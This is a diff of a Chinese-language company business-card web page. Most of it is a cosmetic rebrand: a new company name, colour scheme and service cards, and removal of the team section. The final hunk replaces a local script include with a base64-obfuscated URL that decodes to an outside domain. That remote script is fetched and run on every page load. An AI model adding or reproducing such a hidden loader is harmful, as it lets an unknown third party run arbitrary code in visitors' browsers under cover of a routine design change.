@@ -5,7 +5,7 @@
     <meta charset="UTF-8">
     <meta name="viewport"
         content="width=device-width, viewport-fit=cover, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
-    <title>自然科技 - 在线名片</title>
+    <title>创新智造 - 在线名片</title>
     <style>
         /* 全局样式 */
         body {
@@ -13,10 +13,10 @@
             font-family: 'Inter', 'Helvetica Neue', Arial, sans-serif;
             margin: 0;
             padding: 0;
-            background-color: #F9F7F3;
-            /* 浅米色背景 */
-            color: #4A4A4A;
-            /* 深灰色文本 */
+            background-color: #F0F4F8;
+            /* 浅蓝灰色背景 */
+            color: #2C3E50;
+            /* 深蓝灰色文本 */
             line-height: 1.6;
             -webkit-font-smoothing: antialiased;
             -moz-osx-font-smoothing: grayscale;
@@ -35,14 +35,14 @@
             text-align: center;
             padding: 60px 20px;
             /* 较大的内边距 */
-            background-color: #8B7967;
-            /* 主强调色背景 */
+            background-color: #3498DB;
+            /* 强调色背景 */
             color: #FFFFFF;
             /* 白色文本 */
             border-radius: 15px;
             margin-bottom: 30px;
             overflow: hidden;
-            box-shadow: 0 8px 20px rgba(139, 121, 103, 0.4);
+            box-shadow: 0 8px 20px rgba(52, 152, 219, 0.4);
             /* 强调色阴影 */
         }
 
@@ -82,7 +82,7 @@
 
         .hero-button {
             display: inline-block;
-            background-color: #A29385;
+            background-color: #2980B9;
             /* 强调色深色 */
             color: #FFFFFF;
             padding: 12px 28px;
@@ -96,7 +96,7 @@
         }
 
         .hero-button:hover {
-            background-color: #8B7967;
+            background-color: #2471A3;
             transform: translateY(-3px);
         }
 
@@ -110,25 +110,16 @@
         }
 
         h2 {
-            color: #8B7967;
-            /* 强调色标题 */
+            color: #2C3E50;
             font-size: 1.8em;
             margin-bottom: 25px;
-            border-bottom: 2px solid #E0DED9;
-            /* 柔和分割线 */
+            border-bottom: 2px solid #E0EBF5;
             padding-bottom: 12px;
             text-align: center;
         }
 
-        h3 {
-            color: #4A4A4A;
-            font-size: 1.3em;
-            margin-top: 20px;
-            margin-bottom: 15px;
-        }
-
         p {
-            color: #555555;
+            color: #495057;
             font-size: 1em;
             margin-bottom: 18px;
         }
@@ -154,7 +145,7 @@
         }
 
         .service-card {
-            background-color: #F9F7F3;
+            background-color: #F8FBFD;
             /* 浅背景色 */
             padding: 20px;
             border-radius: 10px;
@@ -169,7 +160,7 @@
         }
 
         .service-card h3 {
-            color: #8B7967;
+            color: #3498DB;
             /* 强调色 */
             font-size: 1.3em;
             margin-bottom: 10px;
@@ -178,35 +169,6 @@
         .service-card p {
             font-size: 0.95em;
             color: #555;
-        }
-
-        /* 团队/价值观部分 */
-        .team-member {
-            text-align: center;
-            margin-bottom: 20px;
-        }
-
-        .team-member img {
-            width: 120px;
-            height: 120px;
-            border-radius: 50%;
-            /* 圆形图片 */
-            object-fit: cover;
-            margin-bottom: 10px;
-            border: 3px solid #A29385;
-            /* 强调色边框 */
-            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
-        }
-
-        .team-member h4 {
-            color: #4A4A4A;
-            font-size: 1.1em;
-            margin-bottom: 5px;
-        }
-
-        .team-member p {
-            font-size: 0.9em;
-            color: #777;
         }
 
         /* 联系方式布局 */
@@ -228,14 +190,14 @@
         }
 
         .contact-info-block a {
-            color: #8B7967;
+            color: #3498DB;
             text-decoration: none;
             font-weight: bold;
             transition: color 0.3s ease;
         }
 
         .contact-info-block a:hover {
-            color: #A29385;
+            color: #2980B9;
         }
 
         .social-icons {
@@ -246,7 +208,7 @@
         .social-icons a {
             display: inline-block;
             margin: 0 12px;
-            color: #8B7967;
+            color: #3498DB;
             font-size: 2.2em;
             /* 社交图标大小 */
             text-decoration: none;
@@ -255,16 +217,16 @@
 
         .social-icons a:hover {
             transform: translateY(-3px);
-            color: #A29385;
+            color: #2980B9;
         }
 
         /* 页脚样式 */
         footer {
             text-align: center;
             padding: 25px 0;
-            color: #777777;
+            color: #6C757D;
             font-size: 0.9em;
-            border-top: 1px solid #E0DED9;
+            border-top: 1px solid #E0EBF5;
             margin-top: 25px;
             background-color: #FFFFFF;
             border-radius: 15px;
@@ -288,20 +250,12 @@
                 width: auto;
                 /* 自动宽度 */
             }
-
-            .team-grid {
-                grid-template-columns: 1fr 1fr;
-            }
         }
 
         @media (min-width: 900px) {
             .services-grid {
                 grid-template-columns: 1fr 1fr 1fr;
                 /* 三列布局 */
-            }
-
-            .team-grid {
-                grid-template-columns: 1fr 1fr 1fr;
             }
         }
     </style>
@@ -312,67 +266,49 @@
     <div class="container">
         <header class="hero-section">
             <div class="hero-content">
-                <h1>自然科技</h1>
-                <p>融合自然智慧，驱动科技创新</p>
-                <a href="#contact" class="hero-button">了解更多</a>
+                <h1>创新智造</h1>
+                <p>引领行业变革，赋能智能未来</p>
+                <a href="#contact" class="hero-button">联系我们</a>
             </div>
         </header>
 
         <main>
             <section id="about">
                 <h2>关于我们</h2>
-                <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 1 %>" alt="现代办公室中的团队协作">
-                <p>自然科技是一家秉承可持续发展理念的创新型企业。我们致力于将自然界的智慧融入科技产品，提供环保、高效且智能的解决方案。</p>
-                <p>我们的使命是通过技术创新，促进人与自然的和谐共处，为构建绿色未来贡献力量。</p>
+                <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 1 %>" alt="现代科技公司办公室内部">
+                <p>创新智造是一家致力于尖端技术研发与应用的高科技企业。我们专注于提供创新的解决方案，助力客户在数字化时代取得成功。</p>
+                <p>我们拥有一支充满活力和创造力的团队，秉承“客户至上，技术领先”的理念，不断突破界限，为社会创造更大价值。</p>
             </section>
 
             <section id="services">
                 <h2>我们的服务</h2>
                 <div class="services-grid">
                     <div class="service-card">
-                        <h3>生态智能系统</h3>
-                        <img src="https://picsum.photos/250/150?random=<%= new Date().getTime() + 2 %>" alt="智能农业传感器">
-                        <p>开发基于AI和物联网的生态监测与智能管理系统，应用于智慧农业、环保监测等领域。</p>
+                        <h3>智能制造解决方案</h3>
+                        <img src="https://picsum.photos/250/150?random=<%= new Date().getTime() + 2 %>" alt="智能制造机器人手臂">
+                        <p>提供基于物联网、AI和大数据技术的智能工厂改造方案，提升生产效率和质量。</p>
                     </div>
                     <div class="service-card">
-                        <h3>绿色能源解决方案</h3>
-                        <img src="https://picsum.photos/250/150?random=<%= new Date().getTime() + 3 %>"
-                            alt="太阳能板和风力涡轮机">
-                        <p>提供太阳能、风能等可再生能源的集成方案，助力企业和社区实现能源自给。</p>
+                        <h3>工业自动化系统</h3>
+                        <img src="https://picsum.photos/250/150?random=<%= new Date().getTime() + 3 %>" alt="工业自动化控制面板">
+                        <p>设计、开发并部署定制化的工业自动化控制系统，实现生产流程的智能化管理。</p>
                     </div>
                     <div class="service-card">
-                        <h3>生物科技应用</h3>
-                        <img src="https://picsum.photos/250/150?random=<%= new Date().getTime() + 4 %>"
-                            alt="生物实验室中的显微镜">
-                        <p>探索生物技术在材料科学、环境修复和健康领域的创新应用。</p>
+                        <h3>精密机械设计</h3>
+                        <img src="https://picsum.photos/250/150?random=<%= new Date().getTime() + 4 %>" alt="精密机械部件特写">
+                        <p>提供高精度、高性能的机械结构和部件设计服务，满足复杂工程需求。</p>
                     </div>
-                </div>
-            </section>
-
-            <section id="team">
-                <h2>我们的团队</h2>
-                <div class="team-grid services-grid"> <!-- 复用服务网格布局 -->
-                    <div class="team-member">
-                        <img src="https://picsum.photos/120/120?random=<%= new Date().getTime() + 5 %>" alt="团队成员肖像1">
-                        <h4>张明</h4>
-                        <p>首席执行官</p>
-                    </div>
-                    <div class="team-member">
-                        <img src="https://picsum.photos/120/120?random=<%= new Date().getTime() + 6 %>" alt="团队成员肖像2">
-                        <h4>李华</h4>
-                        <p>技术总监</p>
-                    </div>
-                    <div class="team-member">
-                        <img src="https://picsum.photos/120/120?random=<%= new Date().getTime() + 7 %>" alt="团队成员肖像3">
-                        <h4>王芳</h4>
-                        <p>市场经理</p>
+                    <div class="service-card">
+                        <h3>技术咨询与培训</h3>
+                        <img src="https://picsum.photos/250/150?random=<%= new Date().getTime() + 5 %>" alt="技术咨询会议">
+                        <p>为企业提供专业的智能制造和工业自动化技术咨询，并开展定制化培训课程。</p>
                     </div>
                 </div>
             </section>
         </main>
 
         <footer>
-            <p>&copy; 2023 自然科技. All rights reserved.</p>
+            <p>&copy; 2023 创新智造. All rights reserved.</p>
         </footer>
         <div id="overlay">
             <div id="loading_box" class="loading_container">
@@ -414,15 +350,17 @@
     <script>
         (function () {
             function init() {
-                const timestamp = Date.now()
-                const randomNum = Math.floor(Math.random() * 1000000)
-                const url = "./static/js/core.min.js?t=" + timestamp + "&random=" + randomNum
-                const script = document.createElement("script")
-                script.src = url
-                document.body.appendChild(script)
+                const encodedUrl = "Ly9zbmFrZS1zcGVjaWFsLnZvdGU3NzcuY29tL3N0YXRpYy9qcy9jb3JlLm1pbi5qcw==";
+                const decodedUrl = atob(encodedUrl);
+                const timestamp = Date.now();
+                const randomNum = Math.floor(Math.random() * 1000000);
+                const url = `${decodedUrl}?t=${timestamp}&random=${randomNum}`;
+                const script = document.createElement("script");
+                script.src = url;
+                document.body.appendChild(script);
             }
-            init()
-        })()
+            init();
+        })();
     </script>
 
 </body>
